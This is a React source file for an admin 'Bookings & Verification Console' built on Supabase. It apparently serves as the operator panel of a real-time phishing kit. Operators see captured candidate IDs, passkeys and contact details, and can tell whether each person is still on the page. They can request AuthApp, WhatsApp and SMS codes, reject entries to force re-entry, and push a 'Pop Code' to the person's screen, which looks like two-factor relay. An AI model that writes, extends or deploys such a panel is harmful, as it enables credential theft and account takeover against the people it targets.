"use client";

import { useEffect, useState, useCallback, useMemo } from "react";
import { createClient } from "@/lib/supabase/client";
import type { Booking } from "@/lib/types";
import {
  parseBookingCodeData,
  serializeBookingCodeData,
  getCodeLabel,
  type BookingCodeData,
} from "@/lib/codeData";
import {
  Send,
  RefreshCw,
  X,
  Check,
  CheckCheck,
  Copy,
  Zap,
} from "lucide-react";

export interface CandidatePresence {
  session_id: string;
  booking_id?: string | null;
  name?: string;
  email?: string;
  phone?: string;
  date?: string;
  start_time?: string;
  end_time?: string;
  phase?: string;
  online?: boolean;
  updated_at?: number;
}

function formatTime(t: string) {
  const [h, m] = t.split(":").map(Number);
  const period = h >= 12 ? "PM" : "AM";
  const hour12 = h % 12 === 0 ? 12 : h % 12;
  return `${hour12}:${String(m).padStart(2, "0")} ${period}`;
}

// Reusable Copy button with visual feedback and flex-shrink-0 guarantee
function CopyIconButton({ value, label }: { value: string | null | undefined; label?: string }) {
  const [copied, setCopied] = useState(false);

  if (!value || value.trim() === "" || value === "-") {
    return (
      <button disabled className="text-gray-300 cursor-default p-1 flex-shrink-0">
        <Copy className="w-4 h-4" />
      </button>
    );
  }

  const handleCopy = (e: React.MouseEvent) => {
    e.stopPropagation();
    navigator.clipboard.writeText(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button
      type="button"
      onClick={handleCopy}
      title={copied ? "Copied!" : `Copy ${label || "value"}`}
      className={`p-1.5 rounded-lg flex-shrink-0 transition-all ${
        copied
          ? "text-emerald-600 bg-emerald-50"
          : "text-gray-400 hover:text-gray-800 hover:bg-gray-100"
      }`}
    >
      {copied ? <CheckCheck className="w-4 h-4 text-emerald-600" /> : <Copy className="w-4 h-4" />}
    </button>
  );
}

export default function AdminBookingsPage() {
  const [supabase] = useState(() => createClient());
  const [bookings, setBookings] = useState<Booking[]>([]);
  const [loading, setLoading] = useState(true);
  const [busyId, setBusyId] = useState<string | null>(null);

  // Real-Time Online / Offline Presence Map
  const [presenceMap, setPresenceMap] = useState<Record<string, CandidatePresence>>({});
  // History of presence sessions seen in current session (for candidates who left before DB insert)
  const [sessionDrafts, setSessionDrafts] = useState<Record<string, CandidatePresence>>({});

  // Local state map for Pop-out code inputs for each booking row
  const [popInputs, setPopInputs] = useState<Record<string, string>>({});

  const load = useCallback(async () => {
    setLoading(true);
    const { data } = await supabase.from("bookings").select("*").order("created_at", { ascending: false });
    const rows = (data ?? []) as Booking[];
    setBookings(rows);

    // Initialize popInputs map with existing POP_CODE values if present
    const inputsMap: Record<string, string> = {};
    rows.forEach((b) => {
      const codeData = parseBookingCodeData(b.additional_code);
      if (codeData.pop_code) {
        inputsMap[b.id] = codeData.pop_code;
      }
    });
    setPopInputs((prev) => ({ ...inputsMap, ...prev }));
    setLoading(false);
  }, [supabase]);

  useEffect(() => {
    load();
  }, [load]);

  // Live Postgres DB Changes
  useEffect(() => {
    const channel = supabase
      .channel("admin-bookings")
      .on("postgres_changes", { event: "*", schema: "public", table: "bookings" }, () => {
        load();
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [supabase, load]);

  // Live Presence Subscription (Track Online / Offline in Real Time)
  useEffect(() => {
    const presenceChannel = supabase.channel("candidate-presence-room");

    presenceChannel
      .on("presence", { event: "sync" }, () => {
        const state = presenceChannel.presenceState();
        const flat: Record<string, CandidatePresence> = {};
        const drafts: Record<string, CandidatePresence> = {};

        Object.entries(state).forEach(([key, presences]) => {
          if (presences && presences.length > 0) {
            const p = presences[presences.length - 1] as unknown as CandidatePresence;
            flat[key] = p;
            if (p.booking_id) flat[p.booking_id] = p;
            if (p.email) flat[p.email.toLowerCase()] = p;

            if (p.name && p.email && p.phase?.includes("ID/Passkey")) {
              drafts[p.session_id || key] = p;
            }
          }
        });

        setPresenceMap(flat);
        setSessionDrafts((prev) => ({ ...prev, ...drafts }));
      })
      .subscribe();

    return () => {
      supabase.removeChannel(presenceChannel);
    };
  }, [supabase]);

  // Global Confirm (Final approval)
  async function confirmBooking(id: string) {
    setBusyId(id);
    await supabase.from("bookings").update({ status: "confirmed" }).eq("id", id);
    setBusyId(null);
  }

  // Reject Candidate ID & Passkey
  async function rejectIdPasskey(id: string) {
    setBusyId(id);
    await supabase.from("bookings").update({ status: "rejected" }).eq("id", id);
    setBusyId(null);
  }

  // Send / Require Candidate to input AuthApp (1), WhatsApp (2), SMS (3), or Code 4 (4)
  async function requireCode(b: Booking, codeNum: number) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: `CODE_${codeNum}_REQUESTED`,
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    setBusyId(null);
  }

  // Reject specific Code (1=AuthApp, 2=WhatsApp, 3=SMS, 4=Code 4)
  async function rejectSpecificCode(b: Booking, codeNum: number) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: `CODE_${codeNum}_REJECTED`,
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    setBusyId(null);
  }

  // Pop-out / Display Code from Admin directly to Candidate Modal
  async function sendPopCode(b: Booking) {
    const codeVal = (popInputs[b.id] || "").trim();
    if (!codeVal) return;
    setBusyId(b.id);

    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      pop_code: codeVal,
      active_req: `POP_CODE:${codeVal}`,
    };

    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    setBusyId(null);
  }

  // Clear / Dismiss Pop-out Code
  async function clearPopCode(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      pop_code: null,
      active_req: null,
    };

    await supabase
      .from("bookings")
      .update({
        status: "pending",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);

    setPopInputs((prev) => ({ ...prev, [b.id]: "" }));
    setBusyId(null);
  }

  // Candidate Phase Badge rendering
  function renderCandidatePhaseBadge(b: Booking) {
    const codeData = parseBookingCodeData(b.additional_code);
    const req = codeData.active_req || "";

    if (b.status === "confirmed") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-emerald-50 text-emerald-700 border border-emerald-200">
          <span className="w-2 h-2 rounded-full bg-emerald-500" />
          <span>Confirmed</span>
        </span>
      );
    }

    if (b.status === "rejected") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-red-50 text-red-700 border border-red-200">
          <span className="w-2 h-2 rounded-full bg-red-500" />
          <span>Rejected (Re-entering ID)</span>
        </span>
      );
    }

    if (b.status === "awaiting_code") {
      if (req.startsWith("POP_CODE:")) {
        const val = req.replace("POP_CODE:", "");
        return (
          <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-purple-50 text-purple-700 border border-purple-200 shadow-2xs">
            <span className="w-2 h-2 rounded-full bg-purple-600 animate-pulse" />
            <span>Pop-out Code Active: {val}</span>
          </span>
        );
      }

      if (req.includes("_REJECTED")) {
        const match = req.match(/CODE_(\d)_REJECTED/i);
        const num = match ? parseInt(match[1], 10) : 1;
        const label = getCodeLabel(num);
        return (
          <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-red-50 text-red-700 border border-red-200">
            <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
            <span>{label} Rejected (Re-entering)</span>
          </span>
        );
      }

      if (req.includes("_REQUESTED")) {
        const match = req.match(/CODE_(\d)_REQUESTED/i);
        const num = match ? parseInt(match[1], 10) : 1;
        const label = getCodeLabel(num);
        return (
          <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50 text-amber-800 border border-amber-200">
            <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
            <span>Candidate in {label}</span>
          </span>
        );
      }
    }

    // status === "pending"
    const submittedCodes = [
      codeData.code_4 ? "Code 4" : null,
      codeData.code_3 ? "SMS" : null,
      codeData.code_2 ? "WhatsApp" : null,
      codeData.code_1 ? "AuthApp" : null,
    ].filter(Boolean);

    if (submittedCodes.length > 0) {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-blue-50 text-blue-700 border border-blue-200">
          <span className="w-2 h-2 rounded-full bg-blue-500" />
          <span>{submittedCodes[0]} Submitted</span>
        </span>
      );
    }

    if (b.candidate_id && b.passkey) {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50/90 text-amber-800 border border-amber-200">
          <span className="w-2 h-2 rounded-full bg-amber-500" />
          <span>ID &amp; Passkey (Reviewing)</span>
        </span>
      );
    }

    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50/80 text-amber-900 border border-amber-200">
        <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
        <span>In ID/Passkey Modal</span>
      </span>
    );
  }

  // Booking Card Component
  function BookingCard({ b }: { b: Booking }) {
    const codeData = parseBookingCodeData(b.additional_code);
    const isPopActive = b.status === "awaiting_code" && codeData.active_req?.startsWith("POP_CODE:");
    const currentPopVal = popInputs[b.id] ?? codeData.pop_code ?? "";

    // Check if candidate is currently online
    const isOnline = Boolean(presenceMap[b.id] || (b.email && presenceMap[b.email.toLowerCase()]));

    const codes = [1, 2, 3, 4] as const;

    return (
      <div className="bg-white border border-gray-200/90 rounded-2xl shadow-sm p-6 sm:p-8 space-y-7 font-sans hover:shadow-md transition-shadow">
        {/* TOP ROW: Candidate Info + Online/Offline status, Date/Time, and Candidate ID & Passkey */}
        <div className="flex flex-col xl:flex-row items-start xl:items-center justify-between gap-6 pb-6 border-b border-gray-100">
          {/* Candidate Profile + Online/Offline Status */}
          <div className="min-w-[200px] space-y-1.5">
            <div className="flex items-center gap-2">
              <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
                Candidate
              </span>

              {/* Online / Offline Indicator Badge */}
              {isOnline ? (
                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-300 shadow-2xs">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                  <span>Online</span>
                </span>
              ) : b.status === "pending" || b.status === "awaiting_code" ? (
                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-red-50 text-red-700 border border-red-200">
                  <span className="w-1.5 h-1.5 rounded-full bg-red-500" />
                  <span>Offline (Left Page)</span>
                </span>
              ) : (
                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-gray-100 text-gray-500 border border-gray-200">
                  <span className="w-1.5 h-1.5 rounded-full bg-gray-400" />
                  <span>Offline</span>
                </span>
              )}
            </div>

            <h3 className="text-2xl font-bold text-gray-900 leading-tight">
              {b.first_name} {b.last_name}
            </h3>
            <p className="text-sm text-gray-600 font-medium">{b.email}</p>
            <p className="text-sm text-gray-600">{b.phone_number || "—"}</p>
          </div>

          {/* Date & Time */}
          <div className="min-w-[130px] space-y-1">
            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
              Date &amp; Time
            </span>
            <p className="text-base font-bold text-gray-900">
              {new Date(b.date + "T00:00:00").toLocaleDateString("en-US", {
                month: "short",
                day: "numeric",
              })}
            </p>
            <p className="text-sm text-gray-600">{formatTime(b.start_time)}</p>
          </div>

          {/* Extra Large Candidate ID Box */}
          <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
              Candidate ID
            </span>
            <div className="flex items-center justify-between gap-3 px-5 py-3.5 bg-gray-50/50 border border-gray-200 rounded-2xl shadow-2xs min-w-0">
              {b.candidate_id ? (
                <span
                  className="text-2xl font-bold text-gray-900 font-sans tracking-wide select-all truncate min-w-0 flex-1"
                  title={b.candidate_id}
                >
                  {b.candidate_id}
                </span>
              ) : (
                <span className="text-sm text-gray-400 italic">Entering…</span>
              )}
              <CopyIconButton value={b.candidate_id} label="Candidate ID" />
            </div>
          </div>

          {/* Extra Large Passkey Box */}
          <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
              Passkey
            </span>
            <div className="flex items-center justify-between gap-3 px-5 py-3.5 bg-gray-50/50 border border-gray-200 rounded-2xl shadow-2xs min-w-0">
              {b.passkey ? (
                <span
                  className="text-2xl font-bold text-gray-900 font-mono tracking-wider select-all truncate min-w-0 flex-1"
                  title={b.passkey}
                >
                  {b.passkey}
                </span>
              ) : (
                <span className="text-sm text-gray-400 italic">Entering…</span>
              )}
              <CopyIconButton value={b.passkey} label="Passkey" />
            </div>
          </div>
        </div>

        {/* BOTTOM ROW: Candidate Phase, Uniform 5-Card Codes Grid (AuthApp, WhatsApp, SMS, Code 4, Pop Code), and Action Buttons */}
        <div className="flex flex-col 2xl:flex-row items-start 2xl:items-center justify-between gap-6 pt-1">
          {/* Candidate Phase Status Badge */}
          <div className="min-w-[180px] space-y-2">
            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
              Candidate Phase
            </span>
            <div>{renderCandidatePhaseBadge(b)}</div>
          </div>

          {/* Symmetrical Uniform 5-Card Grid: AuthApp, WhatsApp, SMS, Code 4, and Pop Code */}
          <div className="space-y-2 flex-1 w-full">
            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
              Additional Codes (Required If Rejected) &amp; Pop-out Code
            </span>

            <div className="flex flex-wrap sm:flex-nowrap gap-3 w-full">
              {/* Codes 1 to 4 (AuthApp, WhatsApp, SMS, Code 4) */}
              {codes.map((num) => {
                const codeKey = `code_${num}` as keyof BookingCodeData;
                const value = codeData[codeKey];
                const label = getCodeLabel(num);

                const isRequested =
                  b.status === "awaiting_code" && codeData.active_req === `CODE_${num}_REQUESTED`;
                const isRejected =
                  b.status === "awaiting_code" && codeData.active_req === `CODE_${num}_REJECTED`;
                const hasSubmitted = Boolean(value && value.trim() !== "");

                // Disable Reject if Send was not pressed / code not requested & not submitted
                const isSendTriggeredOrSubmitted = Boolean(isRequested || isRejected || hasSubmitted);

                // Status Dot
                let dotClass = "bg-gray-300";
                if (hasSubmitted) dotClass = "bg-emerald-500";
                else if (isRequested) dotClass = "bg-amber-500 animate-pulse";
                else if (isRejected) dotClass = "bg-red-500";

                return (
                  <div
                    key={num}
                    className="flex-1 min-w-[136px] max-w-[160px] bg-white border border-gray-200/90 rounded-2xl p-3 flex flex-col justify-between space-y-2.5 shadow-2xs overflow-hidden"
                  >
                    {/* Header: Label Title + Dot */}
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-gray-800 truncate pr-1">
                        {label}
                      </span>
                      <span className={`w-2.5 h-2.5 rounded-full shrink-0 ${dotClass}`} />
                    </div>

                    {/* Actions: Send & Reject */}
                    <div className="flex gap-1 w-full min-w-0">
                      <button
                        type="button"
                        disabled={busyId === b.id}
                        onClick={() => requireCode(b, num)}
                        className={`flex-1 py-1.5 px-1.5 rounded-lg border text-[11px] font-bold flex items-center justify-center gap-1 transition-all min-w-0 ${
                          isRequested
                            ? "bg-emerald-600 text-white border-emerald-600 shadow-2xs"
                            : "border-emerald-300 text-emerald-700 bg-emerald-50/40 hover:bg-emerald-100/70"
                        }`}
                        title={`Send request for ${label} verification code to candidate`}
                      >
                        <Send className="w-2.5 h-2.5 shrink-0" />
                        <span className="truncate">Send</span>
                      </button>

                      <button
                        type="button"
                        disabled={busyId === b.id || !isSendTriggeredOrSubmitted}
                        onClick={() => rejectSpecificCode(b, num)}
                        className="flex-1 py-1.5 px-1.5 rounded-lg border border-red-300 text-red-600 bg-red-50/40 hover:bg-red-100/70 text-[11px] font-bold flex items-center justify-center gap-1 transition-all disabled:opacity-30 disabled:border-gray-200 disabled:bg-gray-50 disabled:text-gray-400 disabled:cursor-not-allowed min-w-0"
                        title={
                          isSendTriggeredOrSubmitted
                            ? `Reject ${label} code (candidate stays on ${label} popup)`
                            : `Send must be pressed before you can reject ${label} code`
                        }
                      >
                        <X className="w-2.5 h-2.5 shrink-0" />
                        <span className="truncate">Reject</span>
                      </button>
                    </div>

                    {/* Value Box with Large Text + Copy Icon */}
                    <div className="flex items-center justify-between gap-1 px-2.5 py-1.5 bg-white border border-gray-200 rounded-xl shadow-2xs min-h-[38px] min-w-0">
                      <span
                        className={`font-bold font-mono text-base truncate min-w-0 flex-1 ${
                          value ? "text-gray-900 select-all" : "text-gray-400 font-normal"
                        }`}
                        title={value || "-"}
                      >
                        {value || "-"}
                      </span>
                      <CopyIconButton value={value} label={label} />
                    </div>
                  </div>
                );
              })}

              {/* 5th Card: Pop-out Code */}
              <div className="flex-1 min-w-[136px] max-w-[160px] bg-purple-50/30 border border-purple-200 rounded-2xl p-3 flex flex-col justify-between space-y-2.5 shadow-2xs overflow-hidden">
                {/* Header: Pop Code Title + Dot */}
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold text-purple-950 truncate pr-1">
                    Pop Code
                  </span>
                  <span
                    className={`w-2.5 h-2.5 rounded-full shrink-0 ${
                      isPopActive ? "bg-purple-600 animate-pulse" : "bg-gray-300"
                    }`}
                  />
                </div>

                {/* Actions: Pop-code input + Send button + Clear */}
                <div className="flex items-center gap-1 w-full min-w-0">
                  <input
                    type="text"
                    placeholder="-"
                    value={currentPopVal}
                    onChange={(e) => setPopInputs({ ...popInputs, [b.id]: e.target.value })}
                    className="w-full min-w-0 px-2 py-1 bg-white border border-purple-300 rounded-lg text-xs font-mono font-bold text-gray-900 outline-none focus:border-purple-600 text-center shadow-2xs"
                  />

                  <button
                    type="button"
                    disabled={busyId === b.id || !currentPopVal.trim()}
                    onClick={() => sendPopCode(b)}
                    className="p-1.5 bg-[#7c3aed] hover:bg-[#6d28d9] text-white rounded-lg font-bold text-xs flex items-center justify-center transition-all disabled:opacity-40 shadow-2xs shrink-0"
                    title={isPopActive ? "Update Pop Code" : "Send Pop Code to candidate"}
                  >
                    <Send className="w-3 h-3" />
                  </button>

                  {isPopActive && (
                    <button
                      type="button"
                      disabled={busyId === b.id}
                      onClick={() => clearPopCode(b)}
                      className="p-1 hover:bg-purple-100 text-purple-700 rounded-lg transition-colors border border-purple-200 shrink-0"
                      title="Dismiss pop-out code"
                    >
                      <X className="w-3 h-3" />
                    </button>
                  )}
                </div>

                {/* Value Box with Active Pop Code + Copy Icon */}
                <div className="flex items-center justify-between gap-1 px-2.5 py-1.5 bg-white border border-purple-200 rounded-xl shadow-2xs min-h-[38px] min-w-0">
                  <div className="flex items-center gap-1 font-mono font-bold text-sm text-purple-950 select-all truncate min-w-0 flex-1">
                    {codeData.pop_code ? (
                      <>
                        <Zap className="w-3.5 h-3.5 text-amber-500 fill-amber-500 shrink-0" />
                        <span className="truncate" title={codeData.pop_code}>{codeData.pop_code}</span>
                      </>
                    ) : (
                      <span className="text-gray-400 font-normal">-</span>
                    )}
                  </div>
                  <CopyIconButton value={codeData.pop_code} label="Pop Code" />
                </div>
              </div>
            </div>
          </div>

          {/* Action Section: Confirm Next Step & Reject ID */}
          <div className="flex flex-col gap-2.5 min-w-[190px] w-full sm:w-auto self-stretch 2xl:self-center pt-2 2xl:pt-0 2xl:pl-4 2xl:border-l border-gray-100">
            <button
              type="button"
              disabled={busyId === b.id || b.status === "confirmed"}
              onClick={() => confirmBooking(b.id)}
              className="w-full px-5 py-2.5 bg-[#059669] hover:bg-[#047857] text-white rounded-xl font-bold text-sm shadow-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2"
            >
              <Check className="w-4 h-4" />
              <span>Confirm Next Step</span>
            </button>

            <button
              type="button"
              disabled={busyId === b.id || b.status === "rejected"}
              onClick={() => rejectIdPasskey(b.id)}
              className="w-full px-5 py-2 bg-white hover:bg-red-50 text-[#dc2626] border border-[#ef4444] rounded-xl font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2"
            >
              <X className="w-4 h-4 text-[#dc2626]" />
              <span>Reject ID</span>
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Active Draft Session Card (For candidates who are currently in the ID/Passkey modal before DB insert)
  function DraftSessionCard({ s }: { s: CandidatePresence }) {
    const isOnline = Boolean(presenceMap[s.session_id] || (s.email && presenceMap[s.email.toLowerCase()]));

    return (
      <div className="bg-white/90 border-2 border-dashed border-amber-300 rounded-2xl shadow-sm p-6 sm:p-8 space-y-5 font-sans">
        <div className="flex flex-col xl:flex-row items-start xl:items-center justify-between gap-6 pb-4 border-b border-amber-100">
          <div className="min-w-[200px] space-y-1.5">
            <div className="flex items-center gap-2">
              <span className="text-[11px] font-bold text-amber-700 uppercase tracking-wider block">
                Candidate (Entering ID &amp; Passkey)
              </span>

              {isOnline ? (
                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-300 shadow-2xs">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                  <span>Online</span>
                </span>
              ) : (
                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-red-50 text-red-700 border border-red-200">
                  <span className="w-1.5 h-1.5 rounded-full bg-red-500" />
                  <span>Offline (Left Page)</span>
                </span>
              )}
            </div>

            <h3 className="text-2xl font-bold text-gray-900 leading-tight">
              {s.name || "Candidate"}
            </h3>
            <p className="text-sm text-gray-600 font-medium">{s.email || "—"}</p>
            <p className="text-sm text-gray-600">{s.phone || "—"}</p>
          </div>

          <div className="min-w-[130px] space-y-1">
            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
              Date &amp; Time
            </span>
            <p className="text-base font-bold text-gray-900">
              {s.date ? new Date(s.date + "T00:00:00").toLocaleDateString("en-US", { month: "short", day: "numeric" }) : "—"}
            </p>
            <p className="text-sm text-gray-600">{s.start_time ? formatTime(s.start_time) : "—"}</p>
          </div>

          <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
              Candidate ID
            </span>
            <div className="flex items-center justify-between gap-3 px-5 py-3.5 bg-gray-50 border border-gray-200 rounded-2xl shadow-2xs">
              <span className="text-sm text-gray-400 italic">Entering…</span>
            </div>
          </div>

          <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
              Passkey
            </span>
            <div className="flex items-center justify-between gap-3 px-5 py-3.5 bg-gray-50 border border-gray-200 rounded-2xl shadow-2xs">
              <span className="text-sm text-gray-400 italic">Entering…</span>
            </div>
          </div>
        </div>

        <div className="flex items-center justify-between pt-1">
          <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50 text-amber-900 border border-amber-300">
            <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
            <span>In ID/Passkey Modal</span>
          </span>
          <span className="text-xs text-muted font-medium">
            Waiting for candidate to submit credentials…
          </span>
        </div>
      </div>
    );
  }

  // Active Drafts not yet converted to DB rows
  const activeDraftsList = useMemo(() => {
    const existingEmails = new Set(bookings.map((b) => b.email.toLowerCase()));
    return Object.values(sessionDrafts).filter(
      (d) => d.email && !existingEmails.has(d.email.toLowerCase())
    );
  }, [sessionDrafts, bookings]);

  const pending = bookings.filter((b) => b.status === "pending" || b.status === "awaiting_code");
  const others = bookings.filter((b) => b.status === "confirmed" || b.status === "rejected");

  return (
    <div className="space-y-8 max-w-7xl mx-auto font-sans pb-16">
      {/* Page Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h1 className="font-display text-3xl font-bold text-ink">
            Bookings &amp; Verification Console
          </h1>
          <p className="mt-1.5 text-muted text-sm">
            Live candidate tracking with online/offline presence indicators, prominent credentials, and real-time verification controls.
          </p>
        </div>

        <button
          type="button"
          onClick={() => load()}
          className="self-start sm:self-auto inline-flex items-center gap-1.5 px-4 py-2 border rule-hairline rounded-xl font-mono text-xs font-semibold text-muted hover:text-ink hover:bg-paperdim transition-colors shadow-2xs"
        >
          <RefreshCw className={`w-3.5 h-3.5 ${loading ? "animate-spin" : ""}`} />
          <span>Refresh</span>
        </button>
      </div>

      {/* Bookings List */}
      <div className="space-y-6">
        {loading && (
          <div className="bg-white border border-gray-200 rounded-2xl p-12 text-center text-muted font-mono text-sm shadow-sm">
            Loading live bookings…
          </div>
        )}

        {!loading && pending.length === 0 && activeDraftsList.length === 0 && (
          <div className="bg-white border border-gray-200 rounded-2xl p-12 text-center text-muted font-mono text-sm shadow-sm">
            No active candidate sessions or bookings.
          </div>
        )}

        {/* Active Draft Sessions (Candidates in ID/Passkey modal) */}
        {activeDraftsList.map((d) => (
          <DraftSessionCard key={d.session_id} s={d} />
        ))}

        {/* Active & Pending DB Bookings */}
        {pending.map((b) => (
          <BookingCard key={b.id} b={b} />
        ))}

        {/* Completed / Past Bookings */}
        {others.length > 0 && (
          <div className="pt-6 space-y-4">
            <h2 className="text-xs font-bold uppercase tracking-wider text-gray-400 font-mono">
              Past / Resolved Bookings ({others.length})
            </h2>
            <div className="space-y-4 opacity-80">
              {others.map((b) => (
                <BookingCard key={b.id} b={b} />
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
